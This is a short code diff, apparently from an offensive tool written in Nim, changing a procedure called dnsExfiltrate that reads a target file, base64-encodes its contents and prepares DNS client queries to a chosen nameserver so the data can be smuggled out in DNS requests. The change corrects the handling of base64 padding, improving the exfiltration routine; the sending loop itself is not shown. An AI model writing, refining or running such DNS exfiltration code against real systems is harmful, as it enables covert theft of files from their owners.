@@ -10,7 +10,7 @@ TODO:
 proc dnsExfiltrate(ns: string, target: string, slp: int): void =
     let
         content = readFile(target)
-        hex = encode(content.replace("=", ""), safe=true)
+        hex = encode(content, safe=true).replace("=", "")
         header = initHeader(randId(), rd = true)
         client = initDnsClient(ns)
         chuckSize = 20 # max 62
